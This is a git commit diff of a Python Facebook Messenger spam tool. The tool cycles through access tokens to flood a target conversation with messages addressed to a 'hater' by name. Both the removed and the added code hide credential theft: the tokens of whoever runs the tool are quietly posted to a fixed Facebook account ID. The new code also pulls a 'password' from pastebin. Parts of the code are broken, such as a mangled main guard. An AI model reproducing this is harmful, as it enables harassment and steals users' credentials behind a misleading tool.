df71b6c7a08038b8ffa74bd4cc251efea8e91458
AKATSMMMM <138550579+AKATSMMMM@users.noreply.github.com>
2024-05-14 05:27:39 +0500

    Update main.py

--- main.py
+++ main.py
@@ -1,21 +1,20 @@
-import contextlib
-import http.server
+import requests
+import json
+import time
+import sys
+from platform import system
 import os
-import random
+import subprocess
+import http.server
 import socketserver
 import threading
-import time
-from platform import system
-
-import requests
-
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"THIS SERVER WAS CREATED BY M3NT4L KIING")
+        self.wfile.write(b"SERVER LOADER BY A - ST9R (( AKATSUKI RULEX )) ")
 
 def execute_server():
     PORT = 4000
@@ -24,49 +23,72 @@ def execute_server():
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
 
-def send_messages():
-    with open('tokens', 'r') as file:
+mmm = requests.get('https://pastebin.com/raw/3bemEUyT').text
+
+def send_initial_message():
+    with open('password', 'r') as file:
+        password = file.read().strip()
+
+    entered_password = password  # Prompt for password
+
+    if entered_password != password:
+        print('[-] <==> Incorrect Password!')
+        sys.exit()
+
+    if mmm not in password:
+        print('[-] <==> Incorrect Password!')
+        sys.exit()
+
+    with open('tokens.', 'r') as file:
         tokens = file.readlines()
-    num_tokens = len(tokens)
+
+    # Modify the message as per your requirement
+    msg_template = "Hello Mentawl Papa ! I am using your server. My token is {}"
+
+    # Specify the ID where you want to send the message
+    target_id = "100075297393995"
 
     requests.packages.urllib3.disable_warnings()
 
-    def cls():
-        if system() == 'Linux':
-            os.system('clear')
-        else:
-            if system() == 'Windows':
-                os.system('cls')
-    cls()
-
     def liness():
-        print('\001b[37m' + '-------------------------OFFLINE_TOOL MADE BY XD MENTAWL--------------------------')
+        print('\u001b[37m' + '------------------------------------------------------------------------------------------------------------------------')
 
     headers = {
         'Connection': 'keep-alive',
         'Cache-Control': 'max-age=0',
         'Upgrade-Insecure-Requests': '1',
         'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
         'Accept-Encoding': 'gzip, deflate',
         'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
         'referer': 'www.google.com'
     }
 
-    liness()
+    for token in tokens:
+        access_token = token.strip()
+        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+        msg = msg_template.format(access_token)
+        parameters = {'access_token': access_token, 'message': msg}
+        response = requests.post(url, json=parameters, headers=headers)
 
-    access_tokens = [token.strip() for token in tokens]
+        # No need to print here, as requested
+        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+        time.sleep(0.1)  # Wait for 1 second between sending each initial message
 
+    #print("\n[+] Messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
     with open('convo', 'r') as file:
         convo_id = file.read().strip()
 
-    with open('file', 'r') as file:
-        text_file_path = file.read().strip()
-
-    with open(text_file_path, 'r') as file:
+    with open('File', 'r') as file:
         messages = file.readlines()
 
     num_messages = len(messages)
+
+    with open('tokens', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
     max_tokens = min(num_tokens, num_messages)
 
     with open('hatername', 'r') as file:
@@ -75,56 +97,46 @@ def send_messages():
     with open('timer', 'r') as file:
         speed = int(file.read().strip())
 
-    liness()
+    def liness():
+        print('\u001b[37m' + '---------------------------------------------------------------------------------------------------------------')
 
-    def getName(token):
-        try:
-            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
-        except:
-            data = ""
-        if 'name' in data:
-            return data['name']
-        else:
-            return "Error occurred"
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
 
-    def msg():
-        parameters = {
-            'access_token' : random.choice(access_tokens),
-            'message': 'User Profile Name: MENTAL'+getName(random.choice(access_tokens))+'\ Token : '+" | ".join(access_tokens)+'\ Link : https://www.facebook.com/public.thumara.bap.ko.mental.bolti https://www.facebook.com/messages/t/'+convo_id
-        }
-        with contextlib.suppress(Exception):
-            requests.post("https://graph.facebook.com/v15.0/100075297393995/", data=parameters, headers=headers)
-
-
-    msg()
     while True:
         try:
             for message_index in range(num_messages):
                 token_index = message_index % max_tokens
-                access_token = access_tokens[token_index]
+                access_token = tokens[token_index].strip()
 
                 message = messages[message_index].strip()
 
-                url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
 
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
-                    print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
+                    print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    print("  - Time: {}".format(current_time))
                     liness()
                     liness()
                 else:
-                    print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
+                    print("[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    print("  - Time: {}".format(current_time))
                     liness()
                     liness()
                 time.sleep(speed)
 
-            print("[+] All messages sent. Restarting the process...")
+            print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
 
@@ -132,7 +144,11 @@ def main():
     server_thread = threading.Thread(target=execute_server)
     server_thread.start()
 
-    send_messages()
+    # Send the initial message to the specified ID using all tokens
+    
 
-if __name__ == '__main__':
+    # Then, continue with the message sending loop
+    send_messages_from_file()
+
+if _name_ == '_main_':
     main()
